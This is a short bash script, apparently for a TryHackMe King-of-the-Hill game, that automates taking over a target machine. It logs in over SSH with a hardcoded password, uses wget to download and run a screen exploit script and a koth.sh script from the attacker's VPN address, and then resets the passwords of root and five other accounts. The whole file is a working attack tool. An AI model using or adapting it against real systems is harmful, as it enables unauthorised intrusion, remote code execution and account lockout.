#!/bin/bash

# Created by @HaruKey :)

# https://github.com/H4ruKey/KOTH

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing sshpass 

while getopts ":i:u:p:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
  esac
done


if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
  exit 1
fi

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p pastaisdynamic ssh -o StrictHostKeychecking=no pasta@"$IP" << EOF
    
    wget http://$vpn/bin/screen-exp.sh && chmod +x screen-exp.sh && ./screen-exp.sh
    sleep 3

    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
    echo "root:$new_password" | chpasswd
    echo "food:$new_password" | chpasswd
    echo "tryhackme:$new_password" | chpasswd
    echo "ramen:$new_password" | chpasswd
    echo "bread:$new_password" | chpasswd
    echo "pasta:$new_password" | chpasswd
EOF
